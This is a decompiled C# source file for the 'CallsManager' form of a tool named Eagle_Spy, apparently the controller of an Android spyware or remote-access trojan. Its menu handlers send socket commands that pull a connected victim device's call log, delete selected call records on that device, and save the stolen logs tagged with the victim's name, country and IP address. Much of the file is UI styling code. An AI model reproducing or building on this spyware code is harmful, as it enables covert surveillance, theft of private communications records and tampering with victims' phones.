using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x0200002A RID: 42
	[DesignerGenerated]
	public partial class CallsManager : Form
	{
		// Token: 0x06000344 RID: 836 RVA: 0x0004C924 File Offset: 0x0004AB24
		public CallsManager()
		{
			base.Load += this.CallsManager_Load;
			base.Activated += this.AngelAndroidForm_Activated;
			base.Deactivate += this.AngelAndroidForm_Deactivate;
			this.Title = "null";
			this.BoxTitlePaintEventArgsWait = false;
			this.InitializeComponent();
		}

		// Token: 0x06000347 RID: 839 RVA: 0x0004D5F4 File Offset: 0x0004B7F4
		private void SpyStyle()
		{
			this.BoxTitle.BackColor = SpySettings.DefaultColor_Background;
			foreach (DataGridView dataGridView in base.Controls.OfType<DataGridView>())
			{
				dataGridView.BackgroundColor = SpySettings.DefaultColor_Background;
				dataGridView.BackColor = SpySettings.DefaultColor_Background;
				dataGridView.ColumnHeadersDefaultCellStyle.BackColor = SpySettings.DefaultColor_Background;
				dataGridView.DefaultCellStyle.BackColor = SpySettings.DefaultColor_Background;
				dataGridView.DefaultCellStyle.SelectionForeColor = SpySettings.DefaultColor_Background;
				dataGridView.DefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground;
				dataGridView.DefaultCellStyle.SelectionBackColor = SpySettings.DefaultColor_Foreground;
				dataGridView.ColumnHeadersDefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground;
			}
		}

		// Token: 0x06000348 RID: 840 RVA: 0x00002F32 File Offset: 0x00001132
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
				return;
			}
			this.TOpacity.Enabled = false;
		}

		// Token: 0x06000349 RID: 841 RVA: 0x0004D6C8 File Offset: 0x0004B8C8
		private void CallsManager_Load(object sender, EventArgs e)
		{
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\5.ico");
			this.SpyStyle();
			this.DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
			this.DGV0.DefaultCellStyle.Font = reso.f;
			if (Operators.CompareString(SpySettings.SAVING_DATA, "No", false) == 0)
			{
				this.SaveToolStripMenuItem.Visible = true;
				this.SaveAsToolStripMenuItem.Visible = true;
			}
			this.Text = this.Title;
			this.TOpacity.Interval = SpySettings.T_Interval;
			this.TOpacity.Enabled = true;
			this.BoxTitlePaintEventArgsWait = true;
		}

		// Token: 0x0600034A RID: 842 RVA: 0x0004D778 File Offset: 0x0004B978
		private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Tag);
					if (this.classClient != null)
					{
						object[] array = new object[]
						{
							this.Client,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".calls",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.resultClient,
								Data.SPL_SOCKET,
								"del",
								Data.SPL_DATA,
								text
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(array);
						this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[i].Index);
					}
				}
			}
		}

		// Token: 0x0600034B RID: 843 RVA: 0x0004D8C8 File Offset: 0x0004BAC8
		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".calls",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.getCalls,
						Data.SPL_SOCKET,
						"calls"
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x0600034C RID: 844 RVA: 0x0004D978 File Offset: 0x0004BB78
		private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
			saveFileDialog.Filter = "html (*.html)|*.html";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					reso.SAVEit((Array)a0);
				}, new object[]
				{
					this.DGV0,
					"null",
					saveFileDialog.FileName,
					this.tmpClientName,
					this.tmpCountry + " - " + this.tmpAddressIP,
					"Call Log",
					"log",
					"null"
				});
			}
			saveFileDialog.Dispose();
		}

		// Token: 0x0600034D RID: 845 RVA: 0x0004DA48 File Offset: 0x0004BC48
		private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			reso.Directory_Exist(this.classClient);
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				reso.SAVEit((Array)a0);
			}, new object[]
			{
				this.DGV0,
				this.tmpFolderUSER,
				"Calls Manager",
				this.tmpClientName,
				this.tmpCountry + " - " + this.tmpAddressIP,
				"Call Log",
				"log",
				DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
			});
		}

		// Token: 0x0600034E RID: 846 RVA: 0x0004DAF8 File Offset: 0x0004BCF8
		private void BoxTitle_Paint(object sender, PaintEventArgs e)
		{
			checked
			{
				if (this.BoxTitlePaintEventArgsWait)
				{
					int count = this.DGV0.Rows.Count;
					string text = "All " + Conversions.ToString(count);
					string text2 = "Selected " + Conversions.ToString(this.DGV0.SelectedRows.Count);
					Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
					e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int)defaultColor_Foreground.R, (int)defaultColor_Foreground.G, (int)defaultColor_Foreground.B)), 0, 1, this.BoxTitle.Width, 1);
					Brush brush = new SolidBrush(SpySettings.DefaultColor_Foreground);
					Brush brush2 = new SolidBrush(Color.FromArgb(170, (int)this.BoxTitle.BackColor.R, (int)this.BoxTitle.BackColor.G, (int)this.BoxTitle.BackColor.B));
					Size size = TextRenderer.MeasureText(text + Strings.Space(10) + text2, reso.f);
					Rectangle rectangle = new Rectangle(0, 2, this.BoxTitle.Width, size.Height + 5);
					e.Graphics.FillRectangle(new Pen(brush2).Brush, rectangle);
					e.Graphics.DrawString(text + Strings.Space(10) + text2 + Strings.Space(10), reso.f, brush, 0f, 2f);
					Size size2 = TextRenderer.MeasureText("S", reso.f);
					if (this.BoxTitle.Height != size2.Height + 3)
					{
						this.BoxTitle.Height = size2.Height + 3;
					}
				}
			}
		}

		// Token: 0x0600034F RID: 847 RVA: 0x00002F68 File Offset: 0x00001168
		private void AngelAndroidForm_Activated(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000350 RID: 848 RVA: 0x00002F68 File Offset: 0x00001168
		private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000351 RID: 849 RVA: 0x00002F68 File Offset: 0x00001168
		private void BoxTitle_Resize(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000352 RID: 850 RVA: 0x00002F68 File Offset: 0x00001168
		private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000353 RID: 851 RVA: 0x00002F68 File Offset: 0x00001168
		private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000354 RID: 852 RVA: 0x00002F68 File Offset: 0x00001168
		private void DGV0_SelectionChanged(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000355 RID: 853
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x06000356 RID: 854
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x06000357 RID: 855 RVA: 0x00002F75 File Offset: 0x00001175
		private void guna2Panel2_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				CallsManager.ReleaseCapture();
				CallsManager.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x040002BA RID: 698
		public TcpClient Client;

		// Token: 0x040002BB RID: 699
		public Client classClient;

		// Token: 0x040002BC RID: 700
		public string Title;

		// Token: 0x040002BD RID: 701
		public string tmpFolderUSER;

		// Token: 0x040002BE RID: 702
		public string tmpClientName;

		// Token: 0x040002BF RID: 703
		public string tmpCountry;

		// Token: 0x040002C0 RID: 704
		public string tmpAddressIP;

		// Token: 0x040002C1 RID: 705
		private bool BoxTitlePaintEventArgsWait;
	}
}
